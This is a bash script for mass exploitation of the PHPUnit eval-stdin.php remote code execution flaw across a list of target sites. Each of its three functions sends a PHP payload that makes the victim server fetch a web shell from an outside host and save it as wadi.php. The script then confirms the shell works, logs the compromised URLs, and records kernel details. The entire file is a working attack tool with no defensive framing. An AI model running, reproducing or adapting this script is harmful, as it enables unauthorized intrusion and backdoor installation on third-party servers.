#!/bin/bash
rce() {
    target=$1
    echo -ne "RCE 1 http://${target} \n";

    upload=$(curl -s --max-time 10 --connect-timeout 10  --data "<?php exec('wget http://www.realizzazionesitiwebcosenza.it/components/com_wrapper/la.txt -O wadi.php');?>" -X GET "${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" | head -1)
    cekshell=$(curl -s "${target}/vendor/phpunit/phpunit/src/Util/PHP/wadi.php");
    if [[ $cekshell =~ 'File mu mas' ]]; then
    echo "Hehehe Lumayan ..."
    echo "http://$target/vendor/phpunit/phpunit/src/Util/PHP/wadi.php" | tee -a lasell.txt
    else
    echo "Gagal Boss !!!"
    fi
    }
rce2() {
    target=$1

    upload=$(curl -s --max-time 10 --connect-timeout 10  --data "<?php exec('wget http://www.realizzazionesitiwebcosenza.it/components/com_wrapper/la.txt -O wadi.php');?>" -X GET "${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" | head -1)
    cekshell=$(curl -s "${target}/vendor/phpunit/phpunit/src/Util/PHP/wadi.php");
    if [[ $cekshell =~ 'File mu mas' ]]; then
    echo "Hehehe Lumayan ..."
    echo "http://$target/vendor/phpunit/phpunit/src/Util/PHP/wadi.php" | tee -a lasellwsa.txt
    else
    echo "Gagal Boss !!!"
    fi
    }    
    
rce3() {
    target=$1

    upload=$(curl -s --max-time 10 --connect-timeout 10  --data "<?php fwrite(fopen('wadi.php','w+'),file_get_contents('http://www.realizzazionesitiwebcosenza.it/components/com_wrapper/la.txt')); ?>" -X GET "${target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" | head -1)
    cekshell=$(curl -s "${target}/vendor/phpunit/phpunit/src/Util/PHP/wadi.php");
    if [[ $cekshell =~ 'File mu mas' ]]; then
    Kernel=$(curl -s --max-time 5 --connect-timeout 5 ${target}/vendor/phpunit/phpunit/src/Util/PHP/wadi.php | grep -i "uname" | cut -d '[' -f 2 | awk '{gsub("uname]","")}1')
    echo "http://$target/vendor/phpunit/phpunit/src/Util/PHP/wadi.php" | tee -a love1.txt
    echo "-----------------------------------------------------"
    echo "$Kernel" | tee -a love1.txt
    echo "-----------------------------------------------------"
    else
    echo "Gagal Boss !!!"
    fi
    }    
for s in $(cat $1); do
    rce $s
    rce2 $s
    rce3 $s
done
